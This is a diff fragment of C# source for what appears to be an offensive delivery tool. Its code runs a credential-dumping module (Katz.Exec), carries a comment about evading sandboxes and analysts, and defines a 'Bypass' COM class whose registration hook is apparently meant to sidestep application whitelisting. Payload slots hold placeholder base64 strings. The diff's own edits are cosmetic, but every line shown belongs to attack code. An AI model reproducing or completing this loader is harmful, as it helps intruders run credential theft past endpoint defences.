@@ -65,8 +65,9 @@ namespace Delivery
                     string f = System.Convert.ToBase64String(e);
                     //File.WriteAllText(@"file.b64",f);
                     Console.WriteLine("{0}", f);
-		    System.Environment.Exit(1);
+                    System.Environment.Exit(1);
                 }
+	    }
             else {
                 //Add any behaviour here to throw off sandbox execution/analysts :)
                 Katz.Exec();
@@ -94,8 +95,7 @@ namespace Delivery
 
     public class Bypass : ServicedComponent
     {
-        public Bypass() { //Console.WriteLine("I am a basic COM Object"); 
-	}
+        public Bypass() { }
 
         [ComRegisterFunction] //This executes if registration is successful
         public static void RegisterClass(string key)
@@ -898,8 +898,6 @@ namespace Delivery
     public class Package
     {
         public static string filex86 = @"INSERT x86 B64 HERE";
-        public static string filex64 = @"INSERT B64 HERE";
-        
+        public static string filex64 = @"INSERT B64 HERE"; 
     }
-  }
 }
